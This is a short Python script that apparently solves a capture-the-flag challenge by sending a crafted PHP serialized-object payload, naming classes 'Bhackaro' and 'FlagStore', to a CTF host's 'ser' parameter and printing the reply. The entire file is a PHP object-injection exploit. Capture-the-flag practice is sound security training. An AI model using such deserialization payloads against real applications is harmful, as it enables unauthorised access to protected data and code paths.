import requests
import re

TARGET = "http://wakeup.challs.ctf.bhackari.it:1337/"

payload = 'o:1:"i:0;O:8:"Bhackaro":1:{s:6:"action";O:9:"FlagStore":1:{s:6:"locked";'

r = requests.get(TARGET, params={"ser": payload})
print(r.text)
